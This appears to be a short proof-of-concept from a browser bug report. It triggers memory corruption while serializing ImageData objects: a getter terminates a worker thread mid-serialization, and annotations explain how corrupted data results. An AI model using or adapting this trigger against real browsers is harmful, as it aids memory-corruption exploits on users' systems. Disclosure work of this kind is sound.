var arr2 = [];
function call_back() {

	block.terminate();  //this call will free all memory in worker thread "block";
	sleep(2000);
	return [1, 2, 3, 4, 5, 6, 7, 8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
}

arr2[0] = new ImageData(0x1ffff, 0x1000);==========>serializing this object will fail because of the function ReserveRawBytes fail due to no memory, but because the return value is wrong, serialization will continue.
arr2.__defineGetter__(1, call_back);     ==========>when serialize the second element, many memory will be freed by the call_back function.
arr2[2] = new ImageData(0x1ffff, 0x1000);==========>so serializing this object will succeed, but the serialized data is already corrupted because the data of the first ImageData object is lost.